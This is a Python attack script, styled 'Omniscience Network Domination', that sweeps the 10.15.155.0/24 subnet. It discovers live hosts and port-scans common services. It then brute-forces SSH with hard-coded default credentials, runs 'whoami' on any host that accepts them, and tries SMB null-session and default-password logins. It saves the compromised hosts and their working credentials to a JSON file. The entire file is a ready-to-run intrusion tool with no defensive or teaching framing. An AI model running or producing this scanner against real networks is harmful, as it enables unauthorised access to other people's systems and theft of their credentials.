import socket
import sys
import os
import json
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
sys.path.insert(0, os.path.dirname(__file__))

print("[+] OMNISCIENCE NETWORK DOMINATION - FULL SCAN & EXPLOIT")
print("[+] Target: 10.15.155.0/24")
print("[+] Max Targets: 20")
print("[+] Starting comprehensive scan...\n")

# Test local connectivity
local_host = socket.gethostbyname(socket.gethostname())
print(f"[+] Local host: {local_host}")

# Define target IPs to scan (first 20 hosts in range)
base_net = "10.15.155"
targets = [f"{base_net}.{i}" for i in range(1, 21)]  # .1 to .20

print(f"[+] Scanning {len(targets)} targets: {targets[0]} to {targets[-1]}")

# Ports to check
PORTS = [22, 80, 443, 445, 3389, 5985, 3306, 5432, 6379, 27017, 8080, 8443, 161, 135, 139, 443, 80]

def scan_target(ip):
    """Scan a single target for open ports"""
    open_ports = {}
    try:
        for port in PORTS:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports[port] = "open"
            sock.close()
    except:
        pass
    return ip, open_ports

# Quick scan for live hosts
print("[*] Phase 1: Host discovery (ICMP/TCP ping)...")
live_hosts = []

def ping_host(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        # Try common ports
        for port in [22, 80, 443]:
            if sock.connect_ex((ip, port)) == 0:
                sock.close()
                return True
        sock.close()
    except:
        pass
    return False

with ThreadPoolExecutor(max_workers=50) as executor:
    future_to_ip = {executor.submit(ping_host, ip): ip for ip in targets}
    for future in as_completed(future_to_ip):
        ip = future_to_ip[future]
        try:
            if future.result():
                live_hosts.append(ip)
                print(f"  [+] {ip} - LIVE")
        except:
            pass

print(f"\n[+] Discovery complete: {len(live_hosts)}/{len(targets)} hosts alive")

# Full port scan on live hosts
print("\n[*] Phase 2: Port scanning live hosts...")
scan_results = {}

def scan_host_full(ip):
    open_ports = []
    try:
        for port in PORTS:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            sock.close()
    except:
        pass
    return ip, open_ports

with ThreadPoolExecutor(max_workers=30) as executor:
    future_to_ip = {executor.submit(scan_host_full, ip): ip for ip in live_hosts}
    for future in as_completed(future_to_ip):
        ip = future_to_ip[future]
        try:
            ip_scanned, ports = future.result()
            if ports:
                scan_results[ip_scanned] = ports
                port_str = ", ".join(map(str, ports))
                print(f"  [+] {ip_scanned}: {port_str}")
        except Exception as e:
            pass

print(f"\n[+] Port scan complete: {len(scan_results)} hosts with open ports")

# Credential lists (from exploit_engine)
SSH_CREDS = [
    ("root", "root"), ("root", ""), ("root", "toor"), ("root", "password"),
    ("admin", "admin"), ("admin", ""), ("admin", "password"),
    ("user", "user"), ("pi", "raspberry"), ("ubuntu", "ubuntu"),
    ("cisco", "cisco"), ("ubnt", "ubnt"), ("guest", "guest")
]

SMB_CREDS = [
    ("", ""), ("guest", ""), ("guest", "guest"),
    ("admin", ""), ("admin", "admin"), ("admin", "password"),
    ("Administrator", ""), ("Administrator", "administrator"),
    ("Administrator", "password")
]

# Try exploitation
print("\n[*] Phase 3: Exploitation attempt...")
compromised = []

def exploit_target(ip, ports):
    """Try to exploit a target"""
    result = {"ip": ip, "method": None, "creds": None, "shell": None}
    
    # Try SSH
    if 22 in ports:
        try:
            import paramiko
            for user, pwd in SSH_CREDS[:8]:  # Try first 8 creds
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, port=22, username=user, password=pwd, timeout=3)
                    # Try to run a command to verify
                    stdin, stdout, stderr = client.exec_command("whoami", timeout=3)
                    output = stdout.read().decode().strip()
                    if output:
                        result["method"] = "ssh"
                        result["creds"] = f"{user}:{pwd}"
                        result["shell"] = output
                        client.close()
                        return result
                    client.close()
                except:
                    continue
        except ImportError:
            pass  # paramiko not available
    
    # Try SMB null session
    if 445 in ports:
        try:
            from impacket.smbconnection import SMBConnection
            conn = SMBConnection(ip, ip, timeout=3)
            conn.login("", "")  # null session
            shares = conn.listShares()
            if shares:
                result["method"] = "smb_null"
                result["creds"] = "(null session)"
                result["shell"] = f"Shares: {len(shares)}"
                conn.logoff()
                return result
        except:
            pass
        
        # Try SMB with creds
        try:
            from impacket.smbconnection import SMBConnection
            for user, pwd in SMB_CREDS[:6]:
                try:
                    conn = SMBConnection(ip, ip, timeout=3)
                    conn.login(user, pwd)
                    conn.logoff()
                    result["method"] = "smb"
                    result["creds"] = f"{user}:{pwd}"
                    result["shell"] = "SMB login successful"
                    return result
                except:
                    continue
        except ImportError:
            pass
    
    # Try other common services if needed
    # (Could add FTP, Telnet, etc. here)
    
    return result if result["method"] else None

# Run exploitation
with ThreadPoolExecutor(max_workers=10) as executor:
    future_to_ip = {executor.submit(exploit_target, ip, ports): ip for ip, ports in scan_results.items()}
    for future in as_completed(future_to_ip):
        ip = future_to_ip[future]
        try:
            exploit_result = future.result()
            if exploit_result:
                compromised.append(exploit_result)
                print(f"  [+] {ip}: {exploit_result['method'].upper()} - {exploit_result['creds']}")
        except Exception as e:
            pass

# Summary
print("\n" + "="*70)
print("OMNISCIENCE NETWORK DOMINATION - RESULTS")
print("="*70)
print(f"Network: 10.15.155.0/24")
print(f"Targets scanned: {len(targets)}")
print(f"Live hosts found: {len(live_hosts)}")
print(f"Hosts with open ports: {len(scan_results)}")
print(f"Successfully compromised: {len(compromised)}")
print("-"*70)

if compromised:
    print("COMPROMISED HOSTS:")
    for host in compromised:
        print(f"  [{host['ip']:15}] {host['method']:10} creds: {host['creds']}")
        if host['shell']:
            print(f"                    shell: {host['shell']}")
else:
    print("No hosts compromised via automatic exploits")
    print("Try manual exploitation or check if credentials are different")

# Save results
results_data = {
    "scan_info": {
        "network": f"{base_net}.0/24",
        "targets_scanned": len(targets),
        "live_hosts": live_hosts,
        "hosts_with_ports": list(scan_results.keys()),
        "compromised_count": len(compromised)
    },
    "compromised_hosts": compromised,
    "scan_results": scan_results
}

with open("omniscience_results.json", "w") as f:
    json.dump(results_data, f, indent=2, default=str)

print(f"\n[+] Full results saved to: omniscience_results.json")
print("[+] Network domination scan complete!")